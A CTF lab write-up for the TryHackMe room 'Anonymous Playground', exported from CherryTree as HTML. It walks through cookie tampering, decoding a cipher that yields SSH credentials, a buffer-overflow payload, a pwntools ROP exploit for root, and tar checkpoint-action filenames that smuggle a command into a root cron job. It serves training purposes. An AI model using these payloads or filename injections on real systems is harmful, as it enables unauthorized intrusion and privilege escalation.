<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>anonymous playground</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>anonymous playground</h1><br/><p><strong><h1>Anonymous Playground</h1></strong></p><p></p><p><strong><h3>Enumeration</h3></strong></p><p></p><p><strong>Rustscan:</strong></p><p><img src="images/53-1.png" alt="images/53-1.png" /></p><p></p><p><strong>Nmap:</strong></p><p><img src="images/53-2.png" alt="images/53-2.png" /></p><p></p><p><strong>Website Enumeration:</strong></p><p><img src="images/53-3.png" alt="images/53-3.png" /></p><p></p><p></p><p><strong>Clicking on Operatives</strong></p><p><img src="images/53-4.png" alt="images/53-4.png" /></p><p></p><p></p><p><strong>Robots.txt</strong></p><p><img src="images/53-5.png" alt="images/53-5.png" /></p><p></p><p><strong>Enumerating the new end-point</strong></p><p><img src="images/53-6.png" alt="images/53-6.png" /></p><p></p><p>We get a message, “You have not been <strong>granted</strong> access”</p><p>I wrote granted in bold because, we get the following when we add <strong>.php</strong> to the link.</p><p><img src="images/53-7.png" alt="images/53-7.png" /></p><p></p><p><strong>Cookie Manipulation:</strong></p><p>I opened the Page in Inspect mode in firefox &amp; opened the cookie in storage. The value for <strong>access</strong> is <strong>denied</strong>.</p><p></p><p><img src="images/53-8.png" alt="images/53-8.png" /></p><p></p><p>I changed the value to <strong>granted</strong> &amp; reloaded the page. I was given access.</p><p><img src="images/53-9.png" alt="images/53-9.png" /></p><p></p><p>We get a ciphered message. The hint in tryhackme room says to write a python script for <strong>‘zA’=&#39;a&#39;</strong></p><p>After researching for a while, I found that the cipher uses 2 charecter blocks <strong>hE, zA, dC ...etc</strong></p><p></p><p>The index of English Alphabets is used ie <strong>a/A = 1......z/Z = 26</strong></p><p>For each pair, The individual indexes are added &amp; then the result is modded with 26 to get the new index.</p><p>The new index is then converted to the corresponding alphabet.</p><p></p><p>Eg.	‘zA’ ------- z =&gt; 26 +  a =&gt; 1 ------- 27%26 ------- 1 &lt;= ‘a’</p><p>		‘hE’ ------- h =&gt; 8	+ e =&gt; 5 ------- 13%26 ------- 13 &lt;= ‘m’</p><p>		</p><p>Thus, we can manually add the indexes of each pair, modulus by 26 &amp; convert back the index to alphabet. However, following is a python script automating the process.</p><p></p><p>############################################</p><p>encoded = input(&quot;Enter the String to Decode =&gt; &quot;)</p><p>all_alpha = &quot;&quot; # String of all lowercase english alphabets</p><p></p><p>for i in range(ord(&#39;a&#39;),ord(&#39;z&#39;)+1):</p><p>	all_alpha += chr(i)</p><p></p><p>print(&quot;Encoded =&gt; &quot; + encoded)</p><p>print(&quot;All alphabets =&gt; &quot; + all_alpha)</p><p>print(&quot;Decoded =&gt; &quot;,end=&quot;&quot;)</p><p></p><p># This loop iterates over all PAIRS of the alphabets, ignoring the &#39;::&#39;</p><p>for i in range(0,len(encoded),2):</p><p>	first_char = encoded[i] # Since the first char in all pairs is lowercase</p><p>	second_char = encoded[i+1].lower() # Since the second char in all pairs is uppercase</p><p>	</p><p>	if first_char == &#39;:&#39;:</p><p>		print(&quot;:&quot;,end=&quot;&quot;)</p><p>		continue</p><p>	</p><p>	first_alpha_position = ord(first_char) - ord(&#39;a&#39;) + 1 </p><p>	second_alpha_position = ord(second_char) - ord(&#39;a&#39;) + 1 </p><p>	</p><p>	decoded_alpha_position = (first_alpha_position + second_alpha_position) % 26 # The modulo operation takes care of the &quot;imagine the list of alphabets arranged in a circular loop&quot; part I was talking about</p><p>	</p><p>	decoded_alpha = all_alpha[decoded_alpha_position - 1] # Array indexes start at 0, yes?</p><p>	print(decoded_alpha,end=&quot;&quot;)</p><p>print(&quot;&quot;)	</p><p>##############################################</p><p></p><p>Now, Lets use the script to encode the message.</p><p><strong>hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN</strong></p><p></p><p><img src="images/53-10.png" alt="images/53-10.png" /></p><p></p><p>Result: (Credentials Found)</p><p><strong>magna:magnaisanelephant</strong></p><p></p><p></p><p><strong><h3>Foothold</h3></strong></p><p></p><p>I SSH to the machine using the above credentials &amp; I was successful.</p><p><img src="images/53-11.png" alt="images/53-11.png" /></p><p></p><p>We found the initial flag in the home directory of the user. Also, we found a linux executible named <strong>hacktheworld</strong></p><p>The executbile has SUID bit set.</p><p></p><p>I copy it to my local machine to Examine.</p><p></p><p><img src="images/53-12.png" alt="images/53-12.png" /></p><p></p><p>It is a simple program that asks for user input. (Maybe its vuknerable to Buffer Overflow)</p><p></p><p></p><p><strong><h3>Privilege Escalation</h3></strong></p><p></p><p>I created a pattern using metasploit </p><p></p><p><strong>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</strong></p><p></p><p>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</p><p></p><p>Open the Program using GDB &amp; run it. Then use the above input.</p><p></p><p><img src="images/53-13.png" alt="images/53-13.png" /></p><p>As we can see, we get he segmentation fault message. Indicating Buffer Overflow.</p><p>Scrolling down, we see the register values.</p><p></p><p><img src="images/53-14.png" alt="images/53-14.png" /></p><p></p><p>Or</p><p>We can use “<strong>i r</strong>” to get he registry values in <strong>gdb</strong></p><p><img src="images/53-15.png" alt="images/53-15.png" /></p><p></p><p>We get the value pushed in RBP: <strong>&#39;c1Ac2Ac3&#39;</strong> with Memory ‘<strong>3363413263413163</strong>’</p><p>You can manully, find the c1Ac2Ac3 in the input &amp; calculate the offset.</p><p>Or</p><p>Use the metasploit tool to find the offset location using the Memory.</p><p></p><p><strong>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 3363413263413163</strong></p><p></p><p><img src="images/53-16.png" alt="images/53-16.png" /></p><p></p><p>We found that Offset is at 64 charecters. Also this is a 64 bit binary, thus is uses 8 byte memory addresses.</p><p>Thus, to reach RIP (Register Pointing to Next Instruction) we need Offset + 8 Bytes for RBP</p><p></p><p>Total After 72 Charecters, we can write in RIP</p><p></p><p><strong>Important</strong></p><p>From Here there are two methods.</p><p><strong>Method - 1 (Simple): Intened by tryhackme room creator which leads to lateral movement</strong></p><p><strong>Method - 2 (Complex): Will lead to root user</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method - 1</span></strong></p><p></p><p>First, I thought to add a shellcode in our data and point the RIP to our shellcode. (This is done in simple buffer overflow)</p><p>However, when I checked the security of the executible, I found the following.</p><p></p><p><img src="images/53-17.png" alt="images/53-17.png" /></p><p></p><p><strong>PIE/ASLR</strong></p><p><strong>ASLR</strong> (Address Space Layout Randomisation) is Kernel level Protection</p><p>ASLR is system based. (Thus, in my Kali environment, i have kept it off so that buffer overflow is easy. The memory of the input doesn&#39;t change in each run if ASLR is OFF.</p><p></p><p>However, the target system has ASLR turned ON. (We verify this by running the program in GDB two times &amp; seeing the memory addresses of the input.)</p><p>Thus, we cannot point the RIP to our shellcode hidden in the input, because each run time the memory location changes.</p><p></p><p></p><p><strong>PIE</strong> (Position Independent Executable) is Binary Protection during Compilation</p><p>PIE is enabled during compilation. However, as we can check above PIE is not enabled.</p><p></p><p></p><p><strong>Note:</strong> But still i cannot execute my shellcode in input even if I try it on my local machine where ASLR is OFF, due to the following protection.</p><p></p><p><strong>NX</strong></p><p>No eXecute (NX Bit)</p><p></p><p>The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they&#39;ve stored on the stack or in a global variable.</p><p></p><p>Thus, we have to find some other way. Lets examine the executible in <strong>ghidra</strong>.</p><p>We added the executable file to a temporary demo project.</p><p></p><p><img src="images/53-18.png" alt="images/53-18.png" /></p><p></p><p>Then start the Decompiler. (Green Dragon Icon). The click on <strong>File ----→ Open</strong> &amp; select the <strong>hacktheword</strong> file.</p><p></p><p><img src="images/53-19.png" alt="images/53-19.png" /></p><p></p><p>Next, We click on Functions &amp; view the main function.</p><p><img src="images/53-20.png" alt="images/53-20.png" /></p><p></p><p>We can now see the decompiled code on the right. As expected the code uses <strong>gets()</strong> function due to which buffer overflow was possible.</p><p>Now, An intresting point to note is the <strong>call_bash</strong> function. Its never been called in the main function. However, the name seems intresting. </p><p>Lets examine it.</p><p></p><p><img src="images/53-21.png" alt="images/53-21.png" /></p><p></p><p>As we can see, the function prints certain text &amp; then sets the UID to hexadecimal 0x539 =&gt; 1337 in decimal.</p><p>Lastly it opens a sh shell.</p><p>Thus, if we can point our RIP register to the start of this function we can open a shell with UID 1337.</p><p></p><p><strong>Note:</strong> NX Enabled will not stop this operation because, this code is in the executable area. (<strong>Not in user Data or Stack area</strong>)</p><p></p><p>To find the memory location of call_bash function we can use 2 methods.</p><p>1. Using ghidra</p><p></p><p>The memory location is highlighted above.</p><p><strong>00400657</strong></p><p></p><p>2. Using readelf tool.</p><p></p><p><strong>readelf -s &lt;Program_Name&gt; 		: 		Lists all the functions memory location.</strong></p><p>We can grep out the <strong>call_bash</strong> function to get our location.</p><p></p><p><strong>readelf -s hacktheworld | grep call_bash</strong></p><p><img src="images/53-22.png" alt="images/53-22.png" /></p><p></p><p>We got the same memory location as in ghidra. (But got the actual 64 bit address)</p><p><strong>0000000000400657</strong></p><p></p><p>Now, lets add this memory in Little Endian format to our payload having 72 bytes of dummy data + the above memory location which will be feeded into the RIP for execution.</p><p></p><p><strong>Payload</strong></p><p></p><p>python -c &quot;print(&#39;A&#39;*72 + &#39;\x57\x06\x40\x00\x00\x00\x00\x00&#39;)&quot;</p><p></p><p>We input this payload into the program.</p><p><img src="images/53-23.png" alt="images/53-23.png" /></p><p></p><p>We are able to call the <strong>call_bash</strong> function successfully using buffer overflow. However, we did not get a shell.</p><p>To have the shell open, we need to add a tool like <strong>cat</strong> to our payload without any agruments.</p><p></p><p><strong>Payload</strong></p><p></p><p>(python -c &quot;print(&#39;A&#39;*72 + &#39;\x57\x06\x40\x00\x00\x00\x00\x00&#39;)&quot;; cat)</p><p></p><p>We input this payload into the program.</p><p><img src="images/53-24.png" alt="images/53-24.png" /></p><p></p><p>This time, the program waited &amp; when any input was passed it exited.</p><p>To Solve this issue, I found 2 Solutions online. (Seems like an issue with the RBP)</p><p></p><p>Solution-1: Change the Start of call_bash to next memory location.</p><p></p><p>From: 0000000000400657 To 0000000000400658</p><p><strong>Final Payload-1</strong></p><p></p><p>(python -c &quot;print(&#39;A&#39;*72 + &#39;\x58\x06\x40\x00\x00\x00\x00\x00&#39;)&quot;; cat)</p><p></p><p>We input this payload into the program.</p><p><img src="images/53-25.png" alt="images/53-25.png" /></p><p></p><p></p><p>Solution-2: Send two sets of memory to RIP so that the function gets executed twice.</p><p></p><p>From: &#39;\x58\x06\x40\x00\x00\x00\x00\x00&#39;  To &#39;\x57\x06\x40\x00\x00\x00\x00\x00\x57\x06\x40\x00\x00\x00\x00\x00&#39;</p><p><strong>Final Payload-2</strong></p><p></p><p>(python -c &quot;print(&#39;A&#39;*72 + &#39;\x57\x06\x40\x00\x00\x00\x00\x00\x57\x06\x40\x00\x00\x00\x00\x00&#39;)&quot;; cat)</p><p></p><p>We input this payload into the program.</p><p><img src="images/53-26.png" alt="images/53-26.png" /></p><p></p><p>Then, we upgrade to a stable shell using python.</p><p></p><p><strong>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</strong></p><p><strong>export TERM=xterm</strong></p><p>Ctrl + Z</p><p><strong>stty raw -echo:fg</strong></p><p></p><p>We got the Second user flag in the home directory of <strong>spooky</strong></p><p></p><p><img src="images/53-27.png" alt="images/53-27.png" /></p><p></p><p>Lets Check the <strong>.webscript</strong></p><p><img src="images/53-28.png" alt="images/53-28.png" /></p><p></p><p>By examining the script, we can tell. The program will create a C Code &amp; then compile it.</p><p>The compiled program has UID bit set (4755) &amp; will call bash.</p><p></p><p>So, we need to somehow, <strong>run this script as root</strong>.</p><p></p><p>I checked the crontab &amp; found an intresting entry.</p><p><img src="images/53-29.png" alt="images/53-29.png" /></p><p></p><p>The <strong>entire</strong> home directory of spooky is being backed up using <strong>tar</strong> by root as * wildcard is used.</p><p>Using GTFObins for <strong>Tar</strong>. We can execute the <strong>.webscript</strong> as root.</p><p></p><p><strong>Note:</strong>  As the .webscript file has code to delete itself upon running. I will make a backup of the file.</p><p></p><p>Create the Following FIles</p><p><strong>touch /home/spooky/&#39;--checkpoint=1&#39;</strong></p><p><strong>touch /home/spooky/&#39;--checkpoint-action=exec=sh .webscript&#39;</strong></p><p></p><p><img src="images/53-30.png" alt="images/53-30.png" /></p><p></p><p>We wait for a minute &amp; list the directory again. We have sucessfully received the output folder named <strong>cache</strong> as per the script.</p><p><img src="images/53-31.png" alt="images/53-31.png" /></p><p></p><p>We found the SUID executable inside the <strong>.cache</strong> folder &amp; run it to get root shell.</p><p><strong>Note:</strong> -p is not mandatory</p><p></p><p><strong>Alternatively</strong>, we can create a shell.sh file having the following contents. Next make it executible</p><p>Start a listner in our local machine &amp; create the following files.</p><p></p><p><img src="images/53-32.png" alt="images/53-32.png" /></p><p></p><p>We will get the connection in our listener when the cronjob runs.</p><p><img src="images/53-33.png" alt="images/53-33.png" /></p><p></p><p>Thanks!!</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method-2</span></strong></p><p></p><p>This method uses ROP gadgets of the registry to gain direct root access.</p><p>As we already know, the call_bash function uses a <strong>setuid</strong> to <strong>1337</strong></p><p>We will try to change the <strong>UID to 0</strong> using <strong>ROP gadgets</strong>.</p><p></p><p>Open the Program with <strong>radare2</strong></p><p></p><p><strong>radare2 -AAAA hacktheworld</strong></p><p></p><p>Then list all the functions using <strong>afl</strong></p><p></p><p><img src="images/53-34.png" alt="images/53-34.png" /></p><p></p><p>To view individual functions we can use :</p><p><strong>s main</strong> to <strong>select</strong> (Changes the prompt address) &amp; then <strong>pdf</strong> to <strong>disassemble</strong></p><p></p><p><img src="images/53-35.png" alt="images/53-35.png" /></p><p></p><p>We see there is call to system function <strong>gets</strong>.</p><p>But no call to <strong>call_bash</strong></p><p></p><p>Next, I checked the other function.</p><p><img src="images/53-36.png" alt="images/53-36.png" /></p><p></p><p>Note: The address of setuid is <strong>0x004006c4</strong></p><p>Following are some of the <strong>ROP Gadgets</strong>:</p><p></p><p><strong>xor rdi,rdi; ret</strong></p><p><strong>mov rdi,0; ret</strong></p><p><strong>push 0; pop rdi; ret</strong></p><p><strong></strong></p><p>I tried to test them whether they are present in the program.</p><p></p><p>/R xor rdi,rdi</p><p>/R mov rdi,0</p><p>/R pop rdi</p><p></p><p><img src="images/53-37.png" alt="images/53-37.png" /></p><p></p><p></p><p>As, we can see above the third ROP gadget is present &amp; is at location <strong>0x00400773</strong></p><p></p><p>Now, let’s summarize our findings so far:</p><p></p><p><strong>rip -&gt; +72</strong></p><p><strong>ROP gadget that sets rdi (setuid param) to 0 -&gt; 0x400773</strong></p><p><strong>setuid() call -&gt; 0x4006c4</strong></p><p></p><p>Since we are working on a x64 binary, the flow would be:</p><p></p><p>    1. The rip is to be overwritten with the address of the ROP gadget</p><p>    2. 0x00000000 is to be pushed on stack (at rsp, the top of the stack)</p><p>    3. The ROP gadget is then invoked, which pops the top of stack (0), and transfers this value to <strong>rdi</strong> (therefore, setting rdi to 0), then calls ret, which now would cause the instruction at the address on the new (increased) rsp to be invoked.</p><p>    4. Therefore, this address should be that of the setuid() call that we took note of earlier.</p><p>    5. After setuid(), the binary then calls system(), and gives us a shell.</p><p></p><p>This gives us the payload structure which must be written exactly in this manner on the stack:</p><p></p><p><strong>72 bytes junk -&gt; 0x00400773 (pop rdi,ret) -&gt; 0x00000000 (for setuid) -&gt; 0x004006c4 (setuid)</strong></p><p></p><p>Lets write a python code to do the above:</p><p></p><p>##########################</p><p></p><p>#!/usr/bin/python3</p><p></p><p>from pwn import *</p><p>import sys</p><p></p><p># Checking argument</p><p>if len(sys.argv) != 2:</p><p>	print(&quot;Usage: &quot; + sys.argv[0] + &quot; target&quot;)</p><p>	exit(0)</p><p></p><p># Getting argument</p><p>target = sys.argv[1]</p><p></p><p># Establishing ssh session</p><p>ssh_session = ssh(&#39;magna&#39;,target,password=&#39;magnaisanelephant&#39;)</p><p>info(&quot;Opening ./hacktheworld&quot;)</p><p>proc = ssh_session.process(&#39;./hacktheworld&#39;)</p><p></p><p># Preparing the payload</p><p>junk = b&quot;A&quot;*72 # Just some junk</p><p>pop_ret = p64(0x00400773) # POP RDI; RET gadget</p><p>zero = p64(0x0) # 0x00000000 to &#39;push&#39; on to stack</p><p>setuid = p64(0x004006c4) # setuid() call in call_bash</p><p></p><p>payload = junk + pop_ret + zero + setuid</p><p></p><p># Getting root shell</p><p>proc.recvrepeat(0.1) # Receives the &quot;Who do you want to hacK? &quot; line</p><p>proc.sendline(payload) # Sends the payload</p><p>proc.interactive() # Gets an interactive shell</p><p></p><p>###########################</p><p></p><p>We run the python script from our local machine.</p><p></p><p><strong>python rop_exploit.py 10.10.151.67</strong></p><p></p><p><img src="images/53-38.png" alt="images/53-38.png" /></p><p></p><p>Thus, we have direct root access using the ROP Gadget.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
